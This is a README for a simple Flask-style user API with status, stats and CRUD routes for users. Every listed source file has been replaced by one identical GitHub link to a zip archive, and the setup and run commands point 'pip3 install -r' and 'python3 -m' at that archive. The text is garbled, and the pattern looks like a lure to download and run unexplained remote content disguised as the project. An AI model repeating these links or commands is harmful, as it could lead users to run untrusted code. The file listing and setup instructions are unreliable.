# Simple API

Simple HTTP API for playing with `User` model.


## Files

### `models/`

- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: base of all models of the API - handle serialization to file
- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: user model

### `api/v1`

- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: entry point of the API
- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: basic endpoints of the API: `/status` and `/stats`
- `https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip`: all users endpoints


## Setup

```
$ pip3 install -r https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip
```


## Run

```
$ API_HOST=0.0.0.0 API_PORT=5000 python3 -m https://github.com/abdulkhaliqsoule/alx-backend-user-data/raw/refs/heads/main/0x03-user_authentication_service/backend-data-alx-user-1.6.zip
```


## Routes

- `GET /api/v1/status`: returns the status of the API
- `GET /api/v1/stats`: returns some stats of the API
- `GET /api/v1/users`: returns the list of users
- `GET /api/v1/users/:id`: returns an user based on the ID
- `DELETE /api/v1/users/:id`: deletes an user based on the ID
- `POST /api/v1/users`: creates a new user (JSON parameters: `email`, `password`, `last_name` (optional) and `first_name` (optional))
- `PUT /api/v1/users/:id`: updates an user based on the ID (JSON parameters: `last_name` and `first_name`)
